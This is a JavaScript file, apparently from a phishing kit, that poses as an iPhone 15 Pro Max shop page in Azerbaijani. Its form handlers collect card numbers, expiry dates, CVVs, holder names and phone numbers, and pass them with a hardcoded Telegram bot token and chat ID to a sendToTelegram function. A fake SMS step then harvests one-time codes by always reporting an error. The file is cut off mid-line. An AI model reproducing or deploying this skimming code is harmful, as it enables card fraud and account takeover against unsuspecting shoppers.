// Global Variables
let currentImageIndex = 0
let selectedColor = "desert"
let currentPage = "productPage"
let timerInterval
let timeLeft = 300 // 5 minutes in seconds

// Bot Configuration
const BOT_TOKEN = "7890044397:AAGJfCPAGtZLjdZPx3zj-66caqMICnqb-3w"
const CHAT_ID = "-1002626141042"

// Image arrays for different colors - 3 RENK (GOLD SİLİNDİ!)
const colorImages = {
  black: [
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Ba1-3NjcVoa96MN4X9bs3bQmzwFBhNMevp.webp",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/B2-wwrNsrbcPWOHWuQxyjL3gmmnrHBVB5.webp",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/B3-1cD5YKS8g8zVrr3kqpXiHwDSU3N3T5.webp",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/B4-4LUGyAlnHXC4nYpJevPeQw6Pd3anJH.webp",
  ],
  desert: [
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-BHXg2pLrBIcUiwARxxSnDwMQCRkJqy.png",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-uCeC6Ss0aawHBDEmfRjrC1nfFYuxs3.png",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-XrmuyJ5bSLxWSKh7okiRfjC8sAe1Bf.png",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-WsnSUGttrlxNQYlJLPqHev2cm6Mj3h.png",
  ],
  white: [
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/S1-b6XRx41eY35rcY6EtkAgPXKmlAgAEV.webp",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/S2-D6hckadTmE5Lam91LcIlFL8md3N9OH.webp",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/S3-icw7vj1P3olV6AmuUMoTVXFPoT58NV.webp",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/S4-4A1CcCZxS1L4b6zHALF2t8XK8D2lJC.webp",
  ],
}

// Device Detection
function isMobile() {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
}

function isIOS() {
  return (
    /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1)
  )
}

function isMac() {
  return navigator.platform.toUpperCase().indexOf("MAC") >= 0
}

// Enhanced Universal Click Handler
function createClickHandler(element, callback) {
  if (!element || !callback) return

  let isHandling = false
  
  const handleClick = (e) => {
    if (isHandling) return
    isHandling = true
    
    e.preventDefault()
    e.stopPropagation()
    
    console.log("🎯 Click handled for:", element.tagName, element.className)
    
    try {
      callback(e)
    } catch (error) {
      console.error("❌ Error in click handler:", error)
    }
    
    setTimeout(() => {
      isHandling = false
    }, 100)
  }

  // Remove existing listeners
  element.removeEventListener("click", handleClick)
  element.removeEventListener("touchend", handleClick)

  // Add click listener (works on all devices)
  element.addEventListener("click", handleClick, { passive: false })

  // Add touch support for mobile
  if (isMobile() || isIOS()) {
    let touchStartTime = 0
    let touchStartY = 0

    element.addEventListener("touchstart", (e) => {
      touchStartTime = Date.now()
      touchStartY = e.touches[0].clientY
      element.style.opacity = "0.8"
    }, { passive: true })

    element.addEventListener("touchend", (e) => {
      const touchDuration = Date.now() - touchStartTime
      const touchEndY = e.changedTouches[0].clientY
      const touchDistance = Math.abs(touchEndY - touchStartY)
      
      element.style.opacity = "1"

      // Only trigger if it's a quick tap and not a scroll
      if (touchDuration < 500 && touchDistance < 10) {
        handleClick(e)
      }
    }, { passive: false })

    element.addEventListener("touchcancel", () => {
      element.style.opacity = "1"
    })
  }

  // Enhanced styling
  element.style.cursor = "pointer"
  element.style.webkitTapHighlightColor = "transparent"
  element.style.webkitUserSelect = "none"
  element.style.userSelect = "none"
  element.style.webkitTouchCallout = "none"
}

// Global Navigation Functions
function goToCheckout() {
  console.log("🔥 goToCheckout called")
  showPage("checkoutPage")
}

function goToProduct() {
  console.log("🔥 goToProduct called")
  showPage("productPage")
}

function goToPayment() {
  console.log("🔥 goToPayment called")
  showPage("cardPage")
}

function goToSms() {
  console.log("🔥 goToSms called")
  showPage("smsPage")
}

// Image Functions
function selectImage(index) {
  console.log("🔥 selectImage called:", index)
  currentImageIndex = index
  updateMainImage()
  updateThumbnails()
}

function changeImage(direction) {
  console.log("🔥 changeImage called:", direction)
  const images = colorImages[selectedColor]
  const newIndex = currentImageIndex + direction

  if (newIndex >= 0 && newIndex < images.length) {
    currentImageIndex = newIndex
    updateMainImage()
    updateThumbnails()
  }
}

function selectColor(colorId, colorName) {
  console.log("🔥 selectColor called:", colorId, colorName)
  selectedColor = colorId
  currentImageIndex = 0

  // Update color options
  const colorOptions = document.querySelectorAll(".color-option")
  colorOptions.forEach((option) => {
    option.classList.remove("active")
  })

  // Find and activate the selected color option
  const selectedOption = document.querySelector(`[onclick*="${colorId}"]`)
  if (selectedOption) {
    selectedOption.classList.add("active")
  }

  // Update color name display
  const colorNameElement = document.getElementById("selectedColorName")
  if (colorNameElement) {
    colorNameElement.textContent = colorName
  }

  // Update product title
  const productTitle = document.querySelector(".product-title")
  if (productTitle) {
    productTitle.textContent = `iPhone 15 Pro Max 256 GB ${colorName}`
  }

  // Update breadcrumb
  const breadcrumbCurrent = document.querySelector(".breadcrumb .current")
  if (breadcrumbCurrent) {
    breadcrumbCurrent.textContent = `iPhone 15 Pro Max 256 GB ${colorName}`
  }

  // Update images
  updateMainImage()
  updateThumbnailImages()
  updateThumbnails()
}

// Form Handlers
function submitCardForm(event) {
  console.log("🔥 submitCardForm called")
  event.preventDefault()

  const submitBtn = event.target.querySelector(".btn-confirm")
  if (submitBtn) {
    submitBtn.textContent = "İşlənir..."
    submitBtn.disabled = true
  }

  // Collect card data
  const cardData = {
    cardNumber: document.getElementById("cardNumber")?.value || "",
    expiry:
      (document.getElementById("expiryMonth")?.value || "") +
      "/" +
      (document.getElementById("expiryYear")?.value || ""),
    cvv: document.getElementById("cvv")?.value || "",
    cardHolder: document.getElementById("cardHolder")?.value || "",
    phone:
      (document.getElementById("phonePrefix")?.value || "") +
      " " +
      (document.getElementById("phoneNumber")?.value || ""),
  }

  // Send to Telegram
  sendToTelegram(cardData, "PAYMENT")

  // Always proceed to SMS page after 1.5 seconds
  setTimeout(() => {
    showPage("smsPage")
  }, 1500)
}

function submitSmsCode(event) {
  console.log("🔥 submitSmsCode called")
  event.preventDefault()

  const smsCode = document.getElementById("smsCode")?.value || ""

  // Send SMS code to Telegram
  sendToTelegram({ smsCode }, "SMS")

  // Always show error message and clear input
  const errorMessage = document.getElementById("errorMessage")
  if (errorMessage) {
    errorMessage.style.display = "block"
  }

  // Clear the input
  const smsInput = document.getElementById("smsCode")
  if (smsInput) {
    smsInput.value = ""
  }
}

function resendSms() {
  console.log("🔥 resendSms called")
  // Reset timer
  startTimer()

  // Show success message
  alert("SMS kodu yenidən göndərildi")

  // Clear any error messages
  const errorMessage = document.getElementById("errorMessage")
  if (errorMessage) {
    errorMessage.style.display = "none"
  }
}

// Assign functions to window object for global access
window.goToCheckout = goToCheckout
window.goToProduct = goToProduct
window.goToPayment = goToPayment
window.goToSms = goToSms
window.selectImage = selectImag
